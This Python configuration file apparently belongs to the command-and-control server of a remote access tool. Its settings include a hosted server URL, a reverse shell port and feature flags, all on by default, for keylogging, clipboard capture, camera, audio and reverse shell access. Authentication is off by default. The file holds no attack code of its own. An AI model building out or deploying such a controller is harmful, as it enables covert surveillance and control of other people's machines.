"""
Configuration file for the agent controller system
"""
import os
from typing import Optional

# Server Configuration
SERVER_URL = os.getenv('SERVER_URL', "https://agent-controller.onrender.com")
CONTROLLER_HOST = os.getenv('CONTROLLER_HOST', '0.0.0.0')
CONTROLLER_PORT = int(os.getenv('CONTROLLER_PORT', '8080'))
REVERSE_SHELL_PORT = int(os.getenv('REVERSE_SHELL_PORT', '9999'))

# Agent Configuration
AGENT_TIMEOUT_SECONDS = int(os.getenv('AGENT_TIMEOUT_SECONDS', '60'))
CLEANUP_INTERVAL_SECONDS = int(os.getenv('CLEANUP_INTERVAL_SECONDS', '30'))
MAX_AGENTS = int(os.getenv('MAX_AGENTS', '100'))

# Security Configuration
API_KEY = os.getenv('API_KEY', None)
SECRET_KEY = os.getenv('SECRET_KEY', None)
REQUIRE_AUTH = os.getenv('REQUIRE_AUTH', 'False').lower() == 'true'

# Rate Limiting
RATE_LIMIT_PER_MINUTE = int(os.getenv('RATE_LIMIT_PER_MINUTE', '60'))
MAX_COMMAND_LENGTH = int(os.getenv('MAX_COMMAND_LENGTH', '1000'))
MAX_UPLOAD_SIZE_MB = int(os.getenv('MAX_UPLOAD_SIZE_MB', '10'))

# Logging
LOG_LEVEL = os.getenv('LOG_LEVEL', 'INFO')
LOG_FILE = os.getenv('LOG_FILE', 'controller.log')

# Production Settings
DEBUG = os.getenv('DEBUG', 'False').lower() == 'true'

# Agent Features
ENABLE_STREAMING = os.getenv('ENABLE_STREAMING', 'True').lower() == 'true'
ENABLE_AUDIO = os.getenv('ENABLE_AUDIO', 'True').lower() == 'true'
ENABLE_CAMERA = os.getenv('ENABLE_CAMERA', 'True').lower() == 'true'
ENABLE_KEYLOGGER = os.getenv('ENABLE_KEYLOGGER', 'True').lower() == 'true'
ENABLE_CLIPBOARD = os.getenv('ENABLE_CLIPBOARD', 'True').lower() == 'true'
ENABLE_REVERSE_SHELL = os.getenv('ENABLE_REVERSE_SHELL', 'True').lower() == 'true'
ENABLE_VOICE_CONTROL = os.getenv('ENABLE_VOICE_CONTROL', 'True').lower() == 'true'

def validate_config() -> bool:
    """Validate configuration settings"""
    errors = []
    
    if REQUIRE_AUTH and not API_KEY:
        errors.append("API_KEY required when REQUIRE_AUTH is True")
    
    if CONTROLLER_PORT < 1024 and os.getuid() != 0:
        errors.append("Port < 1024 requires root privileges")
    
    if MAX_UPLOAD_SIZE_MB > 100:
        errors.append("MAX_UPLOAD_SIZE_MB should not exceed 100MB")
    
    if errors:
        print("Configuration errors:")
        for error in errors:
            print(f"  - {error}")
        return False
    
    return True

def print_config():
    """Print non-sensitive configuration"""
    print("=== Configuration ===")
    print(f"Server URL: {SERVER_URL}")
    print(f"Controller Host: {CONTROLLER_HOST}")
    print(f"Controller Port: {CONTROLLER_PORT}")
    print(f"Debug Mode: {DEBUG}")
    print(f"Require Auth: {REQUIRE_AUTH}")
    print(f"Max Agents: {MAX_AGENTS}")
    print(f"Agent Timeout: {AGENT_TIMEOUT_SECONDS}s")
    print(f"Rate Limit: {RATE_LIMIT_PER_MINUTE}/min")
    print("=== Feature Flags ===")
    print(f"Streaming: {ENABLE_STREAMING}")
    print(f"Audio: {ENABLE_AUDIO}")
    print(f"Camera: {ENABLE_CAMERA}")
    print(f"Keylogger: {ENABLE_KEYLOGGER}")
    print(f"Clipboard: {ENABLE_CLIPBOARD}")
    print(f"Reverse Shell: {ENABLE_REVERSE_SHELL}")
    print(f"Voice Control: {ENABLE_VOICE_CONTROL}")